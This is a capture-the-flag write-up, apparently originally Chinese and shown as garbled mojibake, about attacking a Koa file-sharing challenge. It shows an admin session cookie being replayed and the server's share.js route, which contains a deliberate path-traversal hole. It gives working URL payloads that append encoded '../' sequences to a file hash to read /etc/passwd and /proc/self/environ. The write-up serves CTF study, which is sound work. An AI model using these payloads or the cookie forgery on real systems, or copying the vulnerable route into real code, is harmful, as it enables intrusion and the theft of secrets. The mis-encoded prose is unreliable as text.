Concept.pngâ€},{â€œnameâ€:â€œä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdfâ€,â€œhashâ€:â€œ03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08fâ€,â€œsizeâ€:330767,â€œuploaderâ€:â€œadminâ€,â€œuploader_uidâ€:â€œ100000â€,â€œshareTimeâ€:1699622702846,â€œisYoursâ€:true,â€œisOwnâ€:true,â€œownFnâ€:â€œä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdfâ€},{â€œnameâ€:â€œä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpgâ€,â€œhashâ€:â€œ2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2eâ€,â€œsizeâ€:32920,â€œuploaderâ€:â€œadminâ€,â€œuploader_uidâ€:â€œ100000â€,â€œshareTimeâ€:1699622702870,â€œisYoursâ€:true,â€œisOwnâ€:true,â€œownFnâ€:â€œä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpgâ€},{â€œnameâ€:â€œtest.req.httpâ€,â€œhashâ€:â€œ102982a62a610a3a36d686f574fa2ad1447095da77d0686e6157d02dd37b4e7fâ€,â€œsizeâ€:1085,â€œuploaderâ€:â€œadminâ€,â€œuploader_uidâ€:â€œ100000â€,â€œshareTimeâ€:1699622706331,â€œisYoursâ€:true,â€œisOwnâ€:true,â€œownFnâ€:â€œtest.req.httpâ€}]}

å¯ä»¥çœ‹åˆ°å¤§æ¦‚æ˜¯æ¯ä¸ªæ–‡ä»¶å¯¹åº”æ–‡ä»¶åï¼Œå“ˆå¸Œå€¼å’Œæ–‡ä»¶å¤§å°

æˆ‘ä»¬å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œæƒ³æ³¨å†Œadminå‘ç°å­˜åœ¨ï¼Œæ€è·¯æ˜¯ç™»å½•adminè·å–é‡è¦ä¿¡æ¯
 éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶
 F12çœ‹åˆ°è¯·æ±‚è¿‡ç¨‹ä¸­æœ‰checkè¿‡ç¨‹ï¼Œå“åº”é‡Œé¢æ˜¾ç¤ºæ— æ³•ç§’ä¼ 
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/dd52e5eb46174a7cb6945b57b2c42506.png)bpæŠ“åŒ…ä¸€ä¸‹ï¼Œå‘ç°jsonæ•°æ®åªæœ‰å“ˆå¸Œå€¼å’Œæ–‡ä»¶å
 ç”±äºæˆ‘ä»¬åˆšåˆšä¸‹è½½çš„æ–‡ä»¶é‡Œå¯èƒ½å­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯test.req.httpæ–‡ä»¶
 é‚£ä¹ˆæˆ‘ä»¬åœ¨checkæ—¶ä½¿ç”¨è¯¥æ–‡ä»¶å¯¹åº”çš„å“ˆå¸Œå€¼å»ç»•è¿‡ï¼Œä»è€Œä¸‹è½½ä¸‹æ¥è¯¥æ–‡ä»¶
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/458b48be0a9847b1800ddd88f7424928.png)ç„¶åæ‰“å¼€ä¸‹è½½çš„æ–‡ä»¶

```
POST /api/info/drive/sharezone HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiJhYjg3N2I2MDhjOTBlODJhNzNjMDhlYTBjN2NjNjI4ODdiN2U2YTIwOWJmOTljNjQ0ZjE4YmU3NzQzODkzMGY1In0uWxlkC2QWXTZtHjojaVAhUA.AwN3HB8QSRFNeUMLXAxZAlMLK00eRBoTTXhDAlgPWwZcAXceFUIdHEt2QwQLWlxVXQd/H0BGT0dLJEULW11fAlZUek8XQklAG3QXVV5bV1VXC3dOR0QZFRdwFFJRD15SAVB6SkMWTkBKdUBQWVxfBlQHf08URkgRH3dAAl8NWQc
Host: localhost:21920
Origin: http://localhost:21920
Pragma: no-cache
Referer: http://localhost:21920/sharezone
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
sec-ch-ua: "Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
1234567891011121314151617181920
```

æˆ‘ä»¬å‘ç°cookieå€¼ï¼Œå°è¯•ä¼ªé€ cookie
 æˆ‘ä»¬åˆ·æ–°é¡µé¢ï¼Œbpä¿®æ”¹cookieå€¼ï¼ŒæˆåŠŸä»¥ä»¥adminç™»å½•
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/7867098d98e34b6188f4ef0e8b9e9159.png)æŠŠè¿™ä¸ªshare.jsä¸‹è½½ä¸‹æ¥ï¼Œæºç å¦‚ä¸‹

```js
const Router = require("koa-router");
const router = new Router();
const CONFIG = require("../../runtime.config.json");
const Res = require("../../components/utils/response");
const FileSignUtil = require("../../components/utils/file-signature");
const { DriveUtil } = require("../../components/utils/database.utilities");
const fs = require("fs");
const path = require("path");
const { verifySession } = require("../../components/utils/session");
const logger = global.logger;

/**
 * @deprecated
 * ! FIXME: å‘ç°æ¼æ´ï¼Œè¯·è¿›è¡Œä¿®æ”¹
 */
router.get("/s/:hashfn", async (ctx, next) => {
    const hash_fn = String(ctx.params.hashfn || '')
    const hash = hash_fn.slice(0, 64)
    const from_uid = ctx.query.from_uid
    const custom_fn = ctx.query.fn

    // å‚æ•°æ ¡éªŒ
    if (typeof hash_fn !== "string" || typeof from_uid !== "string") {
        // invalid params or query
        ctx.set("X-Error-Reason", "Invalid Params");
        ctx.status = 400; // Bad Request
        return ctx.res.end();
    }

    // æ˜¯å¦ä¸ºå…±äº«çš„æ–‡ä»¶
    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)
    if (!IS_FILE_EXIST) {
        ctx.set("X-Error-Reason", "File Not Found");
        ctx.status = 404; // Not Found
        return ctx.res.end();
    }

    // ç³»ç»Ÿä¸­æ˜¯å¦å­˜å‚¨æœ‰è¯¥æ–‡ä»¶
    let IS_FILE_EXIST_IN_STORAGE
    try {
        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn))
    } catch (e) {
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }
    if (!IS_FILE_EXIST_IN_STORAGE) {
        logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`)
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }

    // æ–‡ä»¶åå¤„ç†
    let filename = typeof custom_fn === "string" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));
    filename = filename.replace(/[\\\/\:\*\"\'\<\>\|\?\x00-\x1F\x7F]/gi, "_")

    // å‘é€
    ctx.set("Content-Disposition", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`);
    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))
    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e => {
        logger.error(`Error while sending file ${hash_fn.yellow}`)
        logger.error(e)
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    })
})

module.exports = router;
```

å¯ä»¥çœ‹æ³¨é‡Šæœ‰hintå­˜åœ¨æ¼æ´ã€‚é¦–å…ˆæ˜¯ç»™äº†å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œå…¶ä¸­è·¯å¾„ä¸º`./s/`åŠ ä¸Šå‚æ•°hashfnï¼Œæ£€æµ‹å‰64ä½æ˜¯å¦ä¸ºå“ˆå¸Œå€¼ï¼Œç„¶åä»è¯·æ±‚ä¸­è·å–å‚æ•°fnå’Œfrom_uidï¼Œå…¶ä¸­from_uidè¡¨ç¤ºä¸‹è½½çš„æ–‡ä»¶æ˜¯è¿™ä¸ª uid  çš„ç”¨æˆ·åˆ†äº«çš„ï¼›æ¥ç€å°±æ˜¯å‚æ•°æ£€æµ‹ï¼Œæ˜¯å¦ä¸ºå…±äº«æ–‡ä»¶ï¼ˆå‚æ•°ä¸ºå“ˆå¸Œå€¼å’Œfrom_uidï¼‰ï¼Œæ˜¯å¦å­˜å‚¨è¯¥æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åå¤„ç†ï¼›æœ€åå‘é€æ—¶åˆ©ç”¨path.resolveå‡½æ•°å¤„ç†ï¼Œæ³¨æ„é‡Œé¢çš„å‚æ•°`hash_fn`æ˜¯å®Œå…¨å¯æ§çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è®©64ä½å“ˆå¸Œå€¼åé¢è·Ÿä¸Š`../`å³å¯å®ç°è·¯å¾„ç©¿è¶Š

æ—¢ç„¶æˆ‘ä»¬çŸ¥é“å‚æ•°hashfnå¯æ§ï¼Œéšä¾¿ä¸€ä¸ªåœ¨å…¬å…±èµ„æºåŒºçš„å“ˆå¸Œå€¼æ‹¼æ¥ä¸Š`/../../../../etc/passwd`ï¼Œç„¶åç”±äºè¦éªŒè¯èº«ä»½ï¼Œä¼ å‚`from_uid=100000`
 ï¼ˆå…¶ä¸­çš„`/`urlç¼–ç ä¸€ä¸‹ï¼‰

```http
http://node4.buuoj.cn:29715/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?from_uid=100000
```

å‘ç°ä¸‹è½½äº†ä¸€ä¸ªéŸ³ä¹æ–‡ä»¶ï¼Œä¸è¿‡æ‰“å¼€å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œçš„
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/730ca7b01bbd4e1d83f3d1cfa1e11fb4.png)
 æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹ç¯å¢ƒå˜é‡

```http
/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000
```

æ‰“å¼€å¾—åˆ°flag
![image-20241026223919792](assets/image-20241026223919792.png)